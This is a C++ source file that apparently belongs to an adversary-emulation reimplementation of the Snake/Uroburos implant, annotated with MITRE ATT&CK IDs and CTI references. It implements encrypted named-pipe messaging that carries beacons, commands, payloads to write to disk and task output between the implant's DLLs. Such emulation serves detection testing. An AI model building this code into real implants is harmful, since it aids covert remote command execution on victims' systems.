/*
 * Handle pipe communications between comms and execution modes
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 * [2] https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */

#include "comms_pipe.h"
#include "logging.h"
#include "util.h"
#include <string>

namespace comms_pipe {

std::vector<unsigned char> pipe_cast128_key;

// Connect to given pipe to write to it. Will block until successful connection
HANDLE ConnectToPipe(ApiWrapperInterface* api_wrapper, LPCWSTR pipe_name) {
    static HANDLE h_pipe;
    DWORD result;

    logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_INFO, "Attempting to connect to named pipe " + util::ConvertWstringToString(pipe_name));
    while(true) {
        h_pipe = api_wrapper->CreateFileWrapper(
            pipe_name,
            GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (h_pipe != INVALID_HANDLE_VALUE) {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_INFO, "Accessed named pipe.");
            break;
        }

        result = api_wrapper->GetLastErrorWrapper();
        if (result == ERROR_PIPE_BUSY) {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_INFO, "Pipe busy. Retrying.");
        } else if (result == ERROR_FILE_NOT_FOUND) {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_ERROR, "Server has not set up pipe yet. Retrying.");
        } else {
            logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_ERROR, "Other error when connecting to pipe. Error code: " + std::to_string(result)); 
        }
        api_wrapper->SleepWrapper(PIPE_CONNECT_SLEEP_MS);
    }
    return h_pipe;
}

/*
 * CreateClientPipe:
 *      About:
 *          Set up a client pipe with permissive security attributes.
 *      Result:
 *          Returns a handle to the created pipe
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
HANDLE CreateClientPipe(ApiWrapperInterface* api_wrapper, DWORD* error_code) {
    static HANDLE h_pipe;

    // Create client-side pipe
    SECURITY_ATTRIBUTES pipe_sa;
    *error_code = CreateNamedPipeSecurityAttr(api_wrapper, &pipe_sa);
    if (*error_code != ERROR_SUCCESS) {
        logging::LogMessage(
            api_wrapper,
            LOG_PIPE_CLIENT, 
            LOG_LEVEL_ERROR, 
            "Failed to set security attribute struct for client pipe. Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    h_pipe = api_wrapper->CreateNamedPipeWrapper(
        PIPE_NAME_CLIENT,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS, // don't accept remote conns
        1, // just one instance at a time
        PIPE_IN_BUFFER,
        PIPE_OUT_BUFFER,
        0,
        &pipe_sa
    );
    if (h_pipe == INVALID_HANDLE_VALUE) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_PIPE_CLIENT, 
            LOG_LEVEL_ERROR, 
            "Failed to create client pipe " + util::ConvertWstringToString(PIPE_NAME_CLIENT) + ". Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    logging::LogMessage(api_wrapper, LOG_PIPE_CLIENT, LOG_LEVEL_INFO, "Created client pipe " + util::ConvertWstringToString(PIPE_NAME_CLIENT));
    if (api_wrapper->LocalFreeWrapper(pipe_sa.lpSecurityDescriptor) != NULL) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_pipe);
        logging::LogMessage(
            api_wrapper,
            LOG_PIPE_CLIENT, 
            LOG_LEVEL_ERROR, 
            "Failed to free memory for pipe security descriptor. Error code: " + std::to_string(*error_code)
        );
        return INVALID_HANDLE_VALUE;
    }
    *error_code = ERROR_SUCCESS;
    return h_pipe;
}

/*
 * GetPipeMsg:
 *      About:
 *         Read in a message from the given pipe handle.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD GetPipeMsg(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, PipeMessage* msg_buf) {
    std::vector<char> v_client_msg;
    BOOL result;
    std::vector<char> response_buffer = std::vector<char>(PIPE_OUT_BUFFER);
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error = ERROR_SUCCESS;
    while(TRUE) {
        result = api_wrapper->ReadFileWrapper(
            h_pipe,
            &response_buffer[0],
            PIPE_OUT_BUFFER,
            &num_bytes_read,
            NULL
        );

        total_bytes_read += num_bytes_read;
        if (num_bytes_read > 0) {
            v_client_msg.insert(v_client_msg.end(), response_buffer.begin(), response_buffer.begin() + num_bytes_read);
        }
        if (!result) {
            error = api_wrapper->GetLastErrorWrapper();
            if (error == ERROR_BROKEN_PIPE) {
                // End of pipe. Normal flow.
                error = ERROR_SUCCESS;
                break;
            } else if (error != ERROR_MORE_DATA) {
                return error;
            }
        }
    }
    std::vector<char> decrypted = pipe_cast128_key.size() > 0 ? enc_handler::Cast128Decrypt(v_client_msg, pipe_cast128_key) : v_client_msg;
    msg_buf->message_type = *((int32_t*)(&decrypted[0]));
    msg_buf->instruction_id = std::string(decrypted.cbegin() + PIPE_MSG_INSTRUCTION_ID_OFFSET, decrypted.cbegin() + PIPE_MSG_DATA_OFFSET);
    msg_buf->data = std::vector<char>(decrypted.begin() + PIPE_MSG_DATA_OFFSET, decrypted.end());
    return ERROR_SUCCESS;
}

/*
 * SendPipeMsg:
 *      About:
 *         Send a message to the given pipe handle.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendPipeMsg(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, PipeMessage* msg_buf) {
    size_t payload_size = msg_buf->data.size();
    size_t msg_size = sizeof(int32_t) + INSTRUCTION_ID_LEN + payload_size;
    std::vector<char> buffer;
    buffer.reserve(msg_size);

    // Populate buffer with message type, instruction ID, and data (optional) fields
    buffer.insert(buffer.begin(), (char*)(&(msg_buf->message_type)), (char*)(&(msg_buf->message_type)) + sizeof(int32_t));
    buffer.insert(buffer.begin() + sizeof(int32_t), msg_buf->instruction_id.begin(), msg_buf->instruction_id.end());
    if (payload_size > 0) {
        buffer.insert(buffer.begin() + sizeof(int32_t) + INSTRUCTION_ID_LEN, &(msg_buf->data[0]), &(msg_buf->data[0]) + payload_size);
    }
    std::vector<char> encrypted = pipe_cast128_key.size() > 0 ? enc_handler::Cast128Encrypt(api_wrapper, buffer, pipe_cast128_key) : buffer;
    DWORD remaining_bytes = encrypted.size();
    DWORD bytes_written;
    DWORD error;

    char* p_seek_buffer = &encrypted[0];
    while (remaining_bytes > 0) {
        if (!api_wrapper->WriteFileWrapper(h_pipe, p_seek_buffer, (remaining_bytes < PIPE_IN_BUFFER ? remaining_bytes : PIPE_IN_BUFFER), &bytes_written, NULL)) {
            error = api_wrapper->GetLastErrorWrapper();
            return error;
        }
        p_seek_buffer += bytes_written;
        remaining_bytes -= bytes_written;
    }
    if (!api_wrapper->FlushFileBuffersWrapper(h_pipe)) {
        return api_wrapper->GetLastErrorWrapper();
    }
    return ERROR_SUCCESS;
}

/*
 * SendCmdResp:
 *      About:
 *         Send a pipe message to the pipe handle for the executor usermodule DLL to execute the contained command.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendCmdResp(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, std::string response) {
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_CMD_RESP;
    msg.instruction_id = std::string(DUMMY_INSTR_ID); // dummy ID, since response string will contain the actual information
    const char* payload = response.c_str();
    msg.data = std::vector<char>(payload, payload + response.length());
    return SendPipeMsg(api_wrapper, h_pipe, &msg); 
}

/*
 * SendPayloadResp:
 *      About:
 *         Send a pipe message containing payload data to the pipe handle for the executor usermodule DLL to write the payload to disk.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendPayloadResp(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, std::string path, std::vector<char> data) {
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_PAYLOAD_RESP;
    msg.instruction_id = std::string(DUMMY_INSTR_ID); // dummy ID, since response string will contain the actual information
    LPCSTR path_str = path.c_str();
    int32_t path_len = (int32_t)strlen(path_str);
    std::vector<char> v_payload_info;

    // Prepend payload info with path length
    v_payload_info.insert(v_payload_info.begin(), (char*)(&(path_len)), (char*)(&(path_len)) + sizeof(int32_t));

    // Add path and payload bytes
    size_t offset = sizeof(int32_t);
    v_payload_info.insert(v_payload_info.begin() + offset, path_str, path_str + path_len);
    offset += path_len;
    v_payload_info.insert(v_payload_info.begin() + offset, data.begin(), data.end());

    msg.data = std::vector<char>(v_payload_info.begin(), v_payload_info.end());
    return SendPipeMsg(api_wrapper, h_pipe, &msg); 
}

/*
 * SendErrorResp:
 *      About:
 *         Send a pipe message containing an error message to the pipe handle for the executor usermodule DLL.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendErrorResp(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, std::string error_msg) {
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_ERROR_RESP;
    msg.instruction_id = std::string(DUMMY_INSTR_ID); // dummy ID
    const char* payload = error_msg.c_str();
    msg.data = std::vector<char>(payload, payload + error_msg.length());
    return SendPipeMsg(api_wrapper, h_pipe, &msg); 
}

/*
 * SendBeaconRequest:
 *      About:
 *         Send a pipe message containing a beacon request to the pipe handle for the communications usermodule DLL.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendBeaconRequest(ApiWrapperInterface* api_wrapper, HANDLE h_pipe) {
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_BEACON;
    msg.instruction_id = std::string(DUMMY_INSTR_ID); // dummy ID
    msg.data = std::vector<char>(); // no payload needed for beacon
    return SendPipeMsg(api_wrapper, h_pipe, &msg); 
}

/*
 * SendTaskOutput:
 *      About:
 *         Send a pipe message containing task output to the pipe handle for the communications usermodule DLL.
 *      Result:
 *          ERROR_SUCCESS on success, otherwise a DWORD error code.
 *      MITRE ATT&CK Techniques:
 *          T1559: Inter-Process Communication
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
DWORD SendTaskOutput(ApiWrapperInterface* api_wrapper, HANDLE h_pipe, std::string instruction_id, std::vector<char> output) {
    PipeMessage msg = PipeMessage();
    msg.message_type = PIPE_MSG_TASK_OUTPUT;
    msg.instruction_id = instruction_id;
    msg.data = std::vector<char>(output);
    return SendPipeMsg(api_wrapper, h_pipe, &msg); 
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/secbp/creating-a-dacl
DWORD CreateNamedPipeSecurityAttr(ApiWrapperInterface* api_wrapper, SECURITY_ATTRIBUTES* sa) {
    sa->nLength = sizeof(SECURITY_ATTRIBUTES);
    sa->bInheritHandle = FALSE;

    std::wstring dacl_str = std::wstring(L"D:") + // Discretionary ACL
        L"(D;OICI;GA;;;BG)" +      // Deny access to built-in guests
        L"(D;OICI;GA;;;AN)" +      // Deny access to anonymous logon
        L"(A;OICI;GRGWGX;;;AU)" +  // Allow RWX to authenticated users
        L"(A;OICI;GA;;;BA)";       // Allow full control to administrators

    BOOL result = api_wrapper->ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        dacl_str.c_str(),
        SDDL_REVISION_1,
        &(sa->lpSecurityDescriptor),
        NULL
    );
    if (!result) {
        return api_wrapper->GetLastErrorWrapper();
    }
    return ERROR_SUCCESS;
}

} // namespace comms_pipe
